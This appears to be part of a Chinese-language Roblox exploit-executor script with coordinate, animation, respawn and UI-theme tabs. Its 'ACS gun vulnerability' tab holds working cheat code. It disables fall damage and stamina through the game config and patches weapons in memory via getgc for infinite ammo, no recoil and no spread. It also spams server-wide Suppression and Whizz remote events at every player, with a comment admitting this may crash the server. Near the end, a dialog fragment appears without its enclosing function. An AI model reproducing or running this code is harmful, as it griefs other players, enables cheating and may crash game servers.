    CoordTab:Dropdown({
        Title = "坐标显示位置",
        Desc = "选择左下角 / 右下角 / 左上角 / 右上角。",
        Values = { "左下角", "右下角", "左上角", "右上角" },
        Value = OverlayCorner,
        Multi = false,
        AllowNone = false,
        Callback = function(option)
            OverlayCorner = normalizeOverlayCorner(option)
            applyOverlayCorner()
            saveData()
            setStatus("坐标显示位置已切换为：" .. tostring(OverlayCorner))
        end,
    })

    --====================================================
    -- Tab 2：坐标管理
    --====================================================

    local ManageTab = Window:Tab({
        Title = "管理已保存的坐标",
        Icon = "lucide:database",
        Locked = false,
    })

    ManageTab:Section({
        Title = "预览所有坐标",
        Box = false,
        Opened = true,
    })

    ManageTab:Dropdown({
        Title = "管理范围",
        Desc = "选择要预览和管理的坐标范围。",
        Values = { "全部坐标", "全局坐标", "当前游戏坐标" },
        Value = ManageScope,
        Multi = false,
        AllowNone = false,
        Callback = function(option)
            ManageScope = option
            ManageSelectedDisplay = nil
            refreshManageDropdown(nil)
            setStatus("管理范围已切换为：" .. tostring(option))
        end,
    })

    ManageDropdown = ManageTab:Dropdown({
        Title = "坐标列表",
        Desc = "选择一个坐标后，可在下方预览、重命名或删除。",
        Values = { "暂无坐标" },
        Value = "暂无坐标",
        Multi = false,
        AllowNone = false,
        Callback = function(option)
            if option == "暂无坐标" then
                ManageSelectedDisplay = nil
                updateManagePreview(nil)
                return
            end

            ManageSelectedDisplay = option

            local pointer = getSelectedManagePointer()
            updateManagePreview(pointer)
        end,
    })

    ManagePreviewParagraph = ManageTab:Paragraph({
        Title = "坐标预览",
        Desc = "暂无选中的坐标。",
    })

    ManageTab:Section({
        Title = "重命名 / 删除",
        Box = false,
        Opened = true,
    })

    ManageTab:Input({
        Title = "新名称",
        Desc = "输入后点击重命名当前选中的坐标。",
        Value = "",
        Type = "Input",
        Placeholder = "输入新坐标名称",
        Callback = function(input)
            ManageRenameText = input
        end,
    })

    ManageTab:Button({
        Title = "重命名选中坐标",
        Desc = "修改当前选中的坐标名称。",
        Locked = false,
        Callback = function()
            renameManagedPoint()
        end,
    })

    ManageTab:Button({
        Title = "删除选中坐标",
        Desc = "删除当前选中的坐标。",
        Locked = false,
        Callback = function()
            local pointer = getSelectedManagePointer()

            if not pointer or not pointer.point then
                setStatus("删除失败：没有选中的坐标。")
                return
            end

            local DeleteDialog

            DeleteDialog = Window:Dialog({
                Title = "删除坐标",
                Content = "确认删除当前选中的坐标？\n\n名称：" .. tostring(pointer.point.name) .. "\n类型：" .. getScopeText(pointer.scope) .. "\n坐标：" .. formatPoint(pointer.point),
                Buttons = {
                    {
                        Title = "取消",
                        Callback = function()
                            if DeleteDialog then
                                DeleteDialog:Close()
                            end
                        end,
                    },
                    {
                        Title = "删除",
                        Callback = function()
                            deleteManagedPoint()

                            if DeleteDialog then
                                DeleteDialog:Close()
                            end
                        end,
                    },
                },
            })
        end,
    })

    ManageTab:Button({
        Title = "刷新坐标列表",
        Desc = "如果列表显示不对，点这个刷新。给 UI 库一个台阶下。",
        Locked = false,
        Callback = function()
            refreshAllDropdowns(nil)
            setStatus("已刷新坐标列表。")
        end,
    })

    --====================================================
    -- 初始化
    --====================================================

    refreshAllDropdowns(nil)
    setStatus("坐标传送初始化完成。当前 GameId: " .. CurrentGameId)
end)()

;(function()

local TabFE = Window:Tab({
    Title = "动作功能",
    Icon = "eye",
    Locked = false,
})

-- ===== 提示 =====
TabFE:Paragraph({
    Title = "提示",
    Desc = "实测下面动作全部是别人可见但是如果那个人是新进来的人需要重新开动作他才会可见\n所有动作来自bs源码，感谢bs脚本\n部分不可用是正常的，可能是动作代码被原作者删了"
})

-- ===== 基础 =====
local player = Players.LocalPlayer

local currentTrack = nil

-- ===== 重生处理 =====
player.CharacterAdded:Connect(function()
    currentTrack = nil
end)

-- ===== 获取 Animator =====
local function GetAnimator()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")

    local animator = humanoid:FindFirstChildOfClass("Animator")
    if not animator then
        animator = Instance.new("Animator")
        animator.Parent = humanoid
    end

    return animator
end

-- ===== 播放函数 =====
local function PlayAnim(animId)
    local animator = GetAnimator()

    -- 停旧动画
    if currentTrack then
        currentTrack:Stop()
        currentTrack:Destroy()
        currentTrack = nil
    end

    local anim = Instance.new("Animation")
    anim.AnimationId = animId

    local track = animator:LoadAnimation(anim)
    anim:Destroy()

    track.Priority = Enum.AnimationPriority.Action
    track.Looped = true
    track:Play()

    currentTrack = track
end

-- ===== 总关闭函数 =====
local function StopAllAnim()
    if currentTrack then
        currentTrack:Stop()
        currentTrack:Destroy()
        currentTrack = nil
    end

    -- 兜底清理
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            local animator = humanoid:FindFirstChildOfClass("Animator")
            if animator then
                for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                    track:Stop()
                end
            end
        end
    end
end

-- ===== 总关闭按钮（在最上面）=====
TabFE:Button({
    Title = "关闭所有动作",
    Callback = function()
        StopAllAnim()
    end
})

;(function()
local Tabacs = Window:Tab({
    Title = "acs枪械漏洞",
    Icon = "info",
    Locked = false,
})
Tabacs:Button({
    Title = "禁用摔落伤害",
    Callback = function()

        local ok, err = pcall(function()
            local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
cfg.EnableFallDamage = false
        end)

        if ok then
            Notify("禁用", "成功", 4)
        else
            Notify("禁用失败", tostring(err), 5)
        end

    end
})
Tabacs:Button({
    Title = "禁用体力系统",
    Callback = function()

        local ok, err = pcall(function()
            local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
cfg.EnableStamina = false
        end)

        if ok then
            Notify("禁用", "成功", 4)
        else
            Notify("禁用失败", tostring(err), 5)
        end

    end
})
Tabacs:Button({
    Title = "禁用跳跃冷却",
    Callback = function()

        local ok, err = pcall(function()
            local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
cfg.AntiBunnyHop = false
        end)

        if ok then
            Notify("禁用", "成功", 4)
        else
            Notify("禁用失败", tostring(err), 5)
        end

    end
})
-- =================【先在脚本顶部定义两个开关状态变量】=================
local ErMingEnabled = false  -- 全服耳鸣开关状态
local CaErEnabled = false    -- 全服擦耳音效开关状态


-- =================【1. 全服耳鸣 开关化】=================
Tabacs:Toggle({
    Title = "全服耳鸣",
    Default = false,
    Callback = function(v)
        ErMingEnabled = v -- 更新开关状态

        if v then
            Notify("启用", "全服耳鸣已开启", 4)
            
            -- 使用 task.spawn 新开一个线程跑循环，防止卡死 UI 界面
            task.spawn(function()
                -- 只有当开关为 true 时才继续循环
                while ErMingEnabled do
                    local success, err = pcall(function()
                        for _, player in next, game.Players:GetPlayers() do
                            -- 只有在开关依旧开启时才发包，双重保险
                            if not ErMingEnabled then break end 
                            game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(player, 666, 666, 666)
                        end
                    end)
                    
                    if not success then
                        warn("耳鸣发包出错: " .. tostring(err))
                    end
                    
                    task.wait(0.001) -- 建议稍微加一点点延迟（比如0.1秒），太快可能会导致你自己或服务器直接崩溃
                end
            end)
        else
            Notify("关闭", "全服耳鸣已停止", 4)
        end
    end
})


-- =================【2. 全服子弹擦耳音效 开关化】=================
Tabacs:Toggle({
    Title = "全服子弹擦耳音效",
    Default = false,
    Callback = function(v)
        CaErEnabled = v -- 更新开关状态

        if v then
            Notify("启用", "全服擦耳音效已开启", 4)
            
            -- 新开线程跑循环
            task.spawn(function()
                while CaErEnabled do
                    local success, err = pcall(function()
                        for _, player in next, game.Players:GetPlayers() do
                            if not CaErEnabled then break end
                            game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Whizz:FireServer(player)
                        end
                    end)
                    
                    if not success then
                        warn("擦耳发包出错: " .. tostring(err))
                    end
                    
                    task.wait(0.001) -- 同样建议加极短延迟保护连接
                end
            end)
        else
            Notify("关闭", "全服擦耳音效已停止", 4)
        end
    end
})
Tabacs:Paragraph({
        Title = "说明",
        Desc = "下面的功能没有上面的那么依赖acs所以部分不是acs枪械系统的服务器也可以用\n已经被修改的枪械无法移除修改除非关闭再重生部分服务器会被检测", 
    })

local Plr = game:GetService("Players").LocalPlayer
local ModifiedGuns = {}      -- 防重复账本
local GunListener = nil      -- 监控手部的雷达

-- 【核心设计】统一的功能配置表
local GunHackConfig = {
    InfiniteAmmo = false, -- 无限弹药开关
    NoRecoil     = false, -- 无后坐力开关
    AlwaysAuto   = false, -- 全自动开关
    NoSpread     = false, -- 无扩散开关
}

-- 核心全局检测：当前是否有任意一个功能被开启了？
local function IsAnyFeatureEnabled()
    return GunHackConfig.InfiniteAmmo or GunHackConfig.NoRecoil or GunHackConfig.AlwaysAuto or GunHackConfig.NoSpread
end

-- 统一的魔改函数：在一个循环里搞定所有被开启的功能
local function TweakGunTable(gunTable)
    if not gunTable or type(gunTable) ~= 'table' or not rawget(gunTable, 'Ammo') then return end
    
    -- 【重点】只要任何一个功能开了，我们就要处理。
    -- 这里取消之前的 ModifiedGuns 全锁，改为按需修改，但依然防止同状态下重复进入
    
    -- 1. 无限弹药
    if GunHackConfig.InfiniteAmmo then
        gunTable.Ammo = 9e9
        gunTable.StoredAmmo = 9e9
        gunTable.MaxStoredAmmo = 9e9
    end
    
    -- 2. 无后坐力 (包含枪身和镜头)
    if GunHackConfig.NoRecoil then
        gunTable.gunRecoil = {
            gunRecoilUp = {0,0}, gunRecoilTilt = {0,0}, gunRecoilLeft = {0,0}, gunRecoilRight = {0,0}
        }
        gunTable.camRecoil = {
            camRecoilUp = {0,0}, camRecoilTilt = {0,0}, camRecoilLeft = {0,0}, camRecoilRight = {0,0}
        }
    end
    
    -- 3. 解锁全自动
    if GunHackConfig.AlwaysAuto then
        gunTable.FireModes = {
            ChangeFiremode = true, Semi = true, Burst = true, Auto = true 
        }
    end
    
    -- 4. 无扩散（指哪打哪）
    if GunHackConfig.NoSpread then
        gunTable.MinSpread = 0
        gunTable.MaxSpread = 0
    end
end

-- 统一的单次扫描函数
local function ScanForGuns()
    -- 如果全关了，就没必要浪费 CPU 去遍历内存了
    if not IsAnyFeatureEnabled() then return end
    
    for i, v in pairs(getgc(true)) do
        if type(v) == 'table' and rawget(v, 'Ammo') then
            TweakGunTable(v)
        end
    end
end

-- 统一的雷达管理：负责开启或关闭手部监控
local function ToggleListener(enable)
    if enable then
        if GunListener then return end -- 已经开了就不重复开
        local char = Plr.Character
        if char then
             GunListener = char.ChildAdded:Connect(function(child)
                if child:IsA("Tool") then
                    task.wait()
                    ScanForGuns() -- 换枪时，只执行一次统一扫描
                end
            end)
        end
    else
        if GunListener then
            GunListener:Disconnect()
            GunListener = nil
        end
    end
end

-- 监听角色重生
Plr.CharacterAdded:Connect(function(NewCharacter)
    -- 重生时，如果还有功能开着，就给新身体重新绑雷达
    if IsAnyFeatureEnabled() then
        task.wait(0.5)
        -- 先把旧的断干净
        if GunListener then GunListener:Disconnect() GunListener = nil end
        
        -- 绑定新身体
        GunListener = NewCharacter.ChildAdded:Connect(function(child)
            if child:IsA("Tool") then
                task.wait()
                ScanForGuns()
            end
        end)
        ScanForGuns() -- 顺便扫一下出生枪
    end
end)
-- 开关 1：无限弹药
Tabacs:Toggle({
    Title = "无限弹药",
    Default = false,
    Callback = function(v)
        GunHackConfig.InfiniteAmmo = v -- 仅仅修改表里的配置状态
        if v then
            ToggleListener(true) -- 确保雷达通电
            ScanForGuns()        -- 立刻同步一次
        elseif not IsAnyFeatureEnabled() then
            ToggleListener(false) -- 如果4个开关全关了，雷达自动断电省电
        end
    end
})

-- 开关 2：无后坐力
Tabacs:Toggle({
    Title = "完美无后坐",
    Default = false,
    Callback = function(v)
        GunHackConfig.NoRecoil = v
        if v then
            ToggleListener(true)
            ScanForGuns()
        elseif not IsAnyFeatureEnabled() then
            ToggleListener(false)
        end
    end
})

-- 开关 3：强制全自动
Tabacs:Toggle({
    Title = "解锁全自动射击",
    Default = false,
    Callback = function(v)
        GunHackConfig.AlwaysAuto = v
        if v then
            ToggleListener(true)
            ScanForGuns()
        elseif not IsAnyFeatureEnabled() then
            ToggleListener(false)
        end
    end
})

-- 开关 4：子弹无扩散
Tabacs:Toggle({
    Title = "无弹道扩散 (精准)",
    Default = false,
    Callback = function(v)
        GunHackConfig.NoSpread = v
        if v then
            ToggleListener(true)
            ScanForGuns()
        elseif not IsAnyFeatureEnabled() then
            ToggleListener(false)
        end
    end
})

end)()

;(function()
-- ================= 终止 =================
local TabStop = Window:Tab({
    Title = "终止",
    Icon = "x",
    Locked = false,
})


TabStop:Button({
    Title = "强制退出",
    Callback = function()

        local ok, err = pcall(function()
            game:Shutdown()
        end)

        if ok then
            Notify("退出", "成功", 4)
        else
            Notify("踢出失败", tostring(err), 5)
        end

    end
})

TabStop:Button({
    Title = "自杀（重生）",
    Callback = function()

        local char = LocalPlayer.Character

        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")

            if hum then
                hum.Health = 0
                Notify("已自杀", "角色已重生", 2)
            else
                Notify("失败", "未找到Humanoid", 2)
            end
        else
            Notify("失败", "角色未加载", 2)
        end

    end
})
TabStop:Button({
    Title = "快速原位重生",
    Callback = function()

        local player = LocalPlayer
        local char = player.Character

        if not char then
            Notify("失败", "角色未加载", 2)
            return
        end

        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")

        if not root then
            Notify("失败", "未找到HumanoidRootPart", 2)
            return
        end

        if not hum then
            Notify("失败", "未找到Humanoid", 2)
            return
        end

        local oldCFrame = root.CFrame
        local finished = false
        local conn

        conn = player.CharacterAdded:Connect(function(newChar)
            if finished then return end
            finished = true

            if conn then
                conn:Disconnect()
            end

            task.spawn(function()
                local newRoot = newChar:WaitForChild("HumanoidRootPart", 5)

                if not newRoot then
                    Notify("失败", "新角色未找到HumanoidRootPart", 3)
                    return
                end

                -- 新角色刚出现就立刻拉回原位
                newChar:PivotTo(oldCFrame)
                newRoot.CFrame = oldCFrame

                -- 防止出生点脚本二次拉回，再补一次
                task.wait()
                newChar:PivotTo(oldCFrame)
                newRoot.CFrame = oldCFrame

                Notify("快速重生", "已快速回到原位", 2)
            end)
        end)

        Notify("快速重生", "正在快速重生...", 1)

        -- 立刻死亡
        hum.Health = 0

        -- 如果某些游戏血量归零不够快，补一个断关节
        pcall(function()
            char:BreakJoints()
        end)

    end
})
end)()
game:GetService("Players").RespawnTime = 0
-- =================== 边框系统（稳定记忆版） ===================

task.wait(0.3)

local RunService = game:GetService("RunService")
local Main = Window.UIElements.Main

-- ===== 文件 =====
local BorderModeFile = "WindUI_BorderMode.txt"
local BorderEnabledFile = "WindUI_BorderEnabled.txt"

-- ===== 默认值 =====
local BorderMode = "Rainbow"
local BorderEnabled = true

local BorderSystemReady = false
local BorderConnection = nil

-- ===== 安全读文件 =====
local function ReadTextFileSafe(fileName)
    local result = nil

    pcall(function()
        if isfile and isfile(fileName) then
            result = readfile(fileName)
        end
    end)

    return result
end

local function WriteTextFileSafe(fileName, value)
    pcall(function()
        if writefile then
            writefile(fileName, tostring(value))
        end
    end)
end

-- ===== 读取边框样式 =====
do
    local savedMode = ReadTextFileSafe(BorderModeFile)

    if savedMode == "Rainbow" or savedMode == "Red" or savedMode == "Blue" then
        BorderMode = savedMode
    end
end

-- ===== 读取边框开关 =====
do
    local savedEnabled = ReadTextFileSafe(BorderEnabledFile)

    if savedEnabled == "true" then
        BorderEnabled = true
    elseif savedEnabled == "false" then
        BorderEnabled = false
    else
        BorderEnabled = true
    end
end

-- ===== 清理旧边框 =====
for _, v in ipairs(Main:GetDescendants()) do
    if v:IsA("UIStroke") and v.Name == "RainbowBorder" then
        v:Destroy()
    end
end

-- ===== 创建描边 =====
local Stroke = Instance.new("UIStroke")
Stroke.Name = "RainbowBorder"
Stroke.Thickness = 3.5
Stroke.Color = Color3.new(1, 1, 1)
Stroke.LineJoinMode = Enum.LineJoinMode.Round
Stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Stroke.Enabled = BorderEnabled
Stroke.Parent = Main

-- ===== 彩虹渐变 =====
local Gradient = Instance.new("UIGradient")
Gradient.Name = "RainbowGradient"
Gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0,    Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(0.16, Color3.fromRGB(255, 255, 0)),
    ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
    ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(0, 255, 255)),
    ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 0, 255)),
    ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
    ColorSequenceKeypoint.new(1,    Color3.fromRGB(255, 0, 0))
})
Gradient.Rotation = 1
Gradient.Parent = Stroke

-- ===== 应用边框样式 =====
local function ApplyBorderMode(mode, shouldSave)
    if type(mode) == "table" then
        mode = mode.Value or mode[1]
    end

    mode = tostring(mode or "Rainbow")

    if mode ~= "Rainbow" and mode ~= "Red" and mode ~= "Blue" then
        mode = "Rainbow"
    end

    BorderMode = mode
    _G.BorderMode = BorderMode

    if mode == "Rainbow" then
        Gradient.Enabled = true
        Stroke.Color = Color3.new(1, 1, 1)

    elseif mode == "Red" then
        Gradient.Enabled = false
        Stroke.Color = Color3.fromRGB(255, 60, 60)

    elseif mode == "Blue" then
        Gradient.Enabled = false
        Stroke.Color = Color3.fromRGB(80, 160, 255)
    end

    if shouldSave == true then
        WriteTextFileSafe(BorderModeFile, BorderMode)
    end
end

-- ===== 应用边框开关 =====
local function SetBorderEnabled(v, shouldSave)
    BorderEnabled = v == true
    _G.BorderEnabled = BorderEnabled

    if Stroke then
        Stroke.Enabled = BorderEnabled
    end

    if shouldSave == true then
        WriteTextFileSafe(BorderEnabledFile, BorderEnabled)
    end
end

-- ===== 初始化只应用，不写文件 =====
ApplyBorderMode(BorderMode, false)
SetBorderEnabled(BorderEnabled, false)

-- ===== 动画连接 =====
local currentAngle = 1
Gradient.Rotation = currentAngle

if BorderConnection then
    BorderConnection:Disconnect()
    BorderConnection = nil
end

BorderConnection = RunService.RenderStepped:Connect(function(dt)
    if not Stroke or not Stroke.Parent then
        return
    end

    if not BorderEnabled then
        return
    end

    if BorderMode ~= "Rainbow" then
        return
    end

    if not Gradient.Enabled then
        return
    end

    currentAngle = (currentAngle + dt * 150) % 360
    Gradient.Rotation = currentAngle
end)

-- ===== 圆角 =====
local Corner = Main:FindFirstChildOfClass("UICorner")
if not Corner then
    Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 12)
    Corner.Parent = Main
end

-- ===== 全局 =====
_G.ApplyBorderMode = ApplyBorderMode
_G.SetBorderEnabled = SetBorderEnabled
_G.BorderMode = BorderMode
_G.BorderEnabled = BorderEnabled
_G.BorderConnection = BorderConnection

BorderSystemReady = true

local TabConfig = Window:Tab({
    Title = "配置",
    Icon = "settings",
    Locked = false,
})


-- ================= 主题列表（稳定版） =================

task.wait()

local ThemeList = {}

pcall(function()
    ThemeList = WindUI:GetThemes()
end)

if type(ThemeList) ~= "table" then
    ThemeList = {}
end

-- 手动加入自定义主题，必须先加入，再校验 CurrentTheme
local CustomThemes = {"Aurora", "Cyan", "Blue", "BlackGold"}

for _, themeName in ipairs(CustomThemes) do
    if not table.find(ThemeList, themeName) then
        table.insert(ThemeList, themeName)
    end
end

-- 确保 Dark 存在
if not table.find(ThemeList, "Dark") then
    table.insert(ThemeList, 1, "Dark")
end

-- 去重，同时保持 Dark 在第一位
local SeenTheme = {}
local NewList = {}

table.insert(NewList, "Dark")
SeenTheme["Dark"] = true

for _, themeName in ipairs(ThemeList) do
    if type(themeName) == "string" and themeName ~= "" and not SeenTheme[themeName] then
        table.insert(NewList, themeName)
        SeenTheme[themeName] = true
    end
end

ThemeList = NewList

-- 最后再校验 CurrentTheme
if type(CurrentTheme) ~= "string" or CurrentTheme == "" or not table.find(ThemeList, CurrentTheme) then
    CurrentTheme = "Dark"
end

pcall(function()
    WindUI:SetTheme(CurrentTheme)
end)
-- ================= 主题切换 =================

local ThemeDropdownReady = false

local ThemeDropdown = TabConfig:Dropdown({
    Title = "UI主题",
    Values = ThemeList,
    Value = CurrentTheme,
    Default = CurrentTheme,

    Callback = function(v)
        if typeof(v) == "table" then
            v = v.Value or v[1]
        end

        if type(v) ~= "string" or v == "" then
            return
        end

        if not table.find(ThemeList, v) then
            return
        end

        CurrentTheme = v

        pcall(function()
            WindUI:SetTheme(CurrentTheme)
        end)

        -- 只有初始化完成后，也就是用户手动改的时候，才保存
        if ThemeDropdownReady then
            pcall(function()
                if writefile then
                    writefile(ThemeFile, CurrentTheme)
                end
            end)

            if Notify then
                Notify("主题切换", "已切换为 " .. tostring(CurrentTheme), 2, "success")
            end
        end
    end
})

task.defer(function()
    task.wait(0.25)

    -- 先应用保存的主题
    pcall(function()
        WindUI:SetTheme(CurrentTheme)
    end)

    -- 再把下拉菜单显示同步成当前主题
    pcall(function()
        if ThemeDropdown then
            if ThemeDropdown.Set then
                ThemeDropdown:Set(CurrentTheme)
            elseif ThemeDropdown.Select then
                ThemeDropdown:Select(CurrentTheme)
            elseif ThemeDropdown.SetValue then
                ThemeDropdown:SetValue(CurrentTheme)
            end
        end
    end)

    -- 最后才允许 Callback 写入文件
    ThemeDropdownReady = true
end)

local function GetWindUIBackgroundImageLabel()
    if not Window or not Window.UIElements or not Window.UIElements.Main then
        return nil
    end

    -- WindUI 内部结构：
    -- Window.UIElements.Main.Background 是背景外壳
    -- 真正的背景图是它下面的一个全尺寸 ImageLabel
    local bgHolder = Window.UIElements.Main:FindFirstChild("Background")
    if not bgHolder then
        return nil
    end

    for _, child in ipairs(bgHolder:GetChildren()) do
        if child:IsA("ImageLabel")
            and child.Size.X.Scale == 1
            and child.Size.Y.Scale == 1
            and child.ScaleType == Enum.ScaleType.Crop then
            return child
        end
    end

    return nil
end

local function SetWindUIBackgroundImageTransparencyNow(value)
    local realVal = math.clamp(tonumber(value) or 0, 0, 1)

    -- 同步 WindUI 自己保存的值，防止窗口重新 Open 时被旧值覆盖
    pcall(function()
        Window.BackgroundImageTransparency = realVal
    end)

    -- 调官方内部方法，但它会四舍五入到 0.1，所以后面还要手动补精确值
    pcall(function()
        if Window and type(Window.SetBackgroundImageTransparency) == "function" then
            Window:SetBackgroundImageTransparency(realVal)
        end
    end)

    -- 直接改 WindUI 内部真正显示背景图的 ImageLabel
    -- 只改透明度，不改 Image，所以不会把背景图弄没
    pcall(function()
        local bgImage = GetWindUIBackgroundImageLabel()
        if bgImage then
            bgImage.ImageTransparency = realVal
        end
    end)
end
-- ================= 背景图透明度 =================
TabConfig:Slider({
    Title = "背景图透明度（立即生效）",
    Desc = "0=不透明  100=全透明",
    Value = {
        Min = 0,
        Max = 100,
        Default = math.floor(BgTransValue * 100),
    },
    Increment = 5,
    Callback = function(v)
        local realVal = math.clamp((tonumber(v) or 0) / 100, 0, 1)
        BgTransValue = realVal

        pcall(function()
            if writefile then
                writefile(BgTransFile, tostring(realVal))
            end
        end)

        if BackgroundEnabled then
            SetWindUIBackgroundImageTransparencyNow(realVal)
        end
    end
})

-- ================= UI 快捷键记忆 =================
local UIToggleKeyFile = "NightUIToggleKey.txt"

local function LoadUIToggleKey()
    local saved = nil

    pcall(function()
        if isfile and isfile(UIToggleKeyFile) then
            saved = readfile(UIToggleKeyFile)
        end
    end)

    if saved and Enum.KeyCode[saved] then
        return saved
    end

    return "RightControl"
end

local function SaveUIToggleKey(keyName)
    if not keyName or not Enum.KeyCode[keyName] then
        return
    end

    pcall(function()
        if writefile then
            writefile(UIToggleKeyFile, keyName)
        end
    end)
end
-- ================= UI外发光：记忆 + 逻辑 + 配置开关 =================
local UIGlowFile = "NightUIGlowEnabled.txt"
local UIGlowEnabled = false
local UIGlowConnection = nil
local UIGlowObject = nil
local UIGlowAutoRestored = false

local function LoadUIGlowEnabled()
    local saved = nil

    pcall(function()
        if isfile and isfile(UIGlowFile) then
            saved = readfile(UIGlowFile)
        end
    end)

    if saved == "true" then
        return true
    end

    if saved == "false" then
        return false
    end

    return false
end

local function SaveUIGlowEnabled(v)
    pcall(function()
        if writefile then
            writefile(UIGlowFile, tostring(v))
        end
    end)
end

local function RestoreBackgroundImageSafe()
    pcall(function()
        if BackgroundEnabled and Window then
            Window.BackgroundImage = BgImage
            Window.BackgroundImageTransparency = BgTransValue
        end
    end)
end

local function FindUIGlowObject()
    local main = Window and Window.UIElements and Window.UIElements.Main
    if not main then
        return nil
    end

    -- 优先找 UI 库自带的 Blur
    local blur = main:FindFirstChild("Blur", true)
    if blur and blur:IsA("ImageLabel") then
        return blur
    end

    -- 找不到再找 Shadow
    local shadow = main:FindFirstChild("Shadow", true)
    if shadow and shadow:IsA("ImageLabel") then
        return shadow
    end

    return nil
end

local function ApplyUIGlowVisible(state)
    UIGlowObject = FindUIGlowObject()

    if not UIGlowObject then
        return
    end

    if state then
        UIGlowObject.Visible = true
        UIGlowObject.ImageTransparency = 0.2
    else
        UIGlowObject.ImageTransparency = 1
        UIGlowObject.Visible = false
    end
end

local function StopUIGlow()
    if UIGlowConnection then
        UIGlowConnection:Disconnect()
        UIGlowConnection = nil
    end

    ApplyUIGlowVisible(false)

    -- 关外发光后补一次背景图，防止 UI 层状态被连带影响
    RestoreBackgroundImageSafe()
end

local function StartUIGlow()
    if UIGlowConnection then
        UIGlowConnection:Disconnect()
        UIGlowConnection = nil
    end

    ApplyUIGlowVisible(true)

    UIGlowConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if not UIGlowEnabled then
            return
        end

        if not UIGlowObject or not UIGlowObject.Parent then
            UIGlowObject = FindUIGlowObject()
        end

        if not UIGlowObject then
            return
        end

        local t = tick() * 0.35
        local color = Color3.fromHSV(t % 1, 0.75, 1)

        UIGlowObject.Visible = true
        UIGlowObject.ImageColor3 = color
        UIGlowObject.ImageTransparency = 0.2
    end)
end

local function SetUIGlowEnabled(v, shouldSave)
    UIGlowEnabled = v

    if shouldSave then
        SaveUIGlowEnabled(v)
    end

    if v then
        StartUIGlow()
    else
        StopUIGlow()
    end
end

-- 读取上次保存的外发光状态
UIGlowEnabled = LoadUIGlowEnabled()

TabConfig:Toggle({
    Title = "开关外发光",
    Value = UIGlowEnabled,
    Callback = function(v)
        -- 用户手动点开关时，才保存
        SetUIGlowEnabled(v, true)

        -- 手动操作后补一次背景图，避免背景图被 UI 层刷新影响
        task.defer(function()
            task.wait(0.1)
            RestoreBackgroundImageSafe()
        end)

        if Notify then
            Notify("外发光", v and "已开启" or "已关闭", 2, "success")
        end
    end
})

-- 自动恢复：必须延迟到背景图配置初始化之后
task.defer(function()
    if UIGlowAutoRestored then
        return
    end

    UIGlowAutoRestored = true

    -- 等你的配置页、背景图、主题这些东西先跑完
    task.wait(2)

    -- 先恢复背景图
    RestoreBackgroundImageSafe()

    -- 再恢复外发光
    if UIGlowEnabled then
        SetUIGlowEnabled(true, false)
    else
        SetUIGlowEnabled(false, false)
    end

    -- 外发光启动后，再补一次背景图
    task.wait(0.2)
    RestoreBackgroundImageSafe()
end)
-- ================= UI 快捷键 =================
TabConfig:Keybind({
    Title = "pc端UI快捷键",
    Desc = "按键显示/隐藏菜单",
    Value = LoadUIToggleKey(),
    Callback = function(v)
        local keyCode = Enum.KeyCode[v]

        if keyCode and Window and Window.SetToggleKey then
            Window:SetToggleKey(keyCode)
            SaveUIToggleKey(v)
        end
    end
})

local function YeGetGuiParentsSafe()
    local parents = {}

    local function addParent(parent)
        if parent and not table.find(parents, parent) then
            table.insert(parents, parent)
        end
    end

    pcall(function()
        if gethui then
            addParent(gethui())
        end
    end)

    pcall(function()
        addParent(game:GetService("CoreGui"))
    end)

    pcall(function()
        local player = game:GetService("Players").LocalPlayer
        local playerGui = player and player:FindFirstChildOfClass("PlayerGui")
        addParent(playerGui)
    end)

    return parents
end

local function YeGetConfirmParentSafe()
    local parents = YeGetGuiParentsSafe()

    if parents[1] then
        return parents[1]
    end

    return nil
end

    local confirmBtn = Instance.new("TextButton")
    confirmBtn.Size = UDim2.new(0, 120, 0, 36)
    confirmBtn.Position = UDim2.new(0.5, 10, 1, -52)
    confirmBtn.BackgroundColor3 = confirmColor or Color3.fromRGB(190, 45, 45)
    confirmBtn.Text = tostring(confirmText or "确认")
    confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    confirmBtn.TextSize = 14
    confirmBtn.Font = Enum.Font.GothamBold
    confirmBtn.BorderSizePixel = 0
    confirmBtn.Parent = card

    local confirmCorner = Instance.new("UICorner")
    confirmCorner.CornerRadius = UDim.new(0, 8)
    confirmCorner.Parent = confirmBtn

    local function closePopup(afterClose)
        TweenService:Create(card, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 460, 0, 0),
            Position = UDim2.new(0.5, -230, 0.5, 0)
        }):Play()

        TweenService:Create(bg, TweenInfo.new(0.18), {
            BackgroundTransparency = 1
        }):Play()

        task.delay(0.2, function()
            if gui then
                gui:Destroy()
            end

            YeDangerConfirmBusy = false

            if afterClose then
                afterClose()
            end
        end)
    end

    cancelBtn.MouseButton1Click:Connect(function()
        closePopup()
    end)

    confirmBtn.MouseButton1Click:Connect(function()
        confirmBtn.Active = false
        confirmBtn.AutoButtonColor = false

        closePopup(function()
            if onConfirm then
                onConfirm()
            end
        end)
    end)

    TweenService:Create(card, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 460, 0, cardH),
        Position = UDim2.new(0.5, -230, 0.5, -cardH / 2)
    }):Play()
end

local function YeDeleteLocalFile(fileName)
    local deleted = false

